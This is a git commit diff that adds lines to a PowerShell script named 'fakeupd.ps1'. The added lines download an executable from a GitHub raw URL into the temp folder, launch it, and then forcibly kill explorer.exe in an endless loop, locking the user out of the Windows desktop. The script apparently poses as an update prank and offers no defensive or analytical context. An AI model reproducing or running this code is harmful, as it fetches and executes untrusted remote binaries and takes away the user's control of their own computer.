b75817de46550e2b1e5d99992553c7aacf725c02
Cancarutu2012 <materadetzky2012@gmail.com>
2026-04-22 18:23:18 +0200

    Update fakeupd.ps1

--- fakeupd.ps1
+++ fakeupd.ps1
@@ -1,3 +1,11 @@
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Cancarutu2012/rroll/refs/heads/main/buttery-taskbar.exe' -OutFile '$env:TEMP\test.exe'; Start-Process '$env:TEMP\test.exe'"
+Stop-Process -Name explorer -Force
+
+while ($true) {
+   Stop-Process -Name explorer -Force
+}
+
+
 Add-Type -AssemblyName PresentationFramework
 
 while ($true) {
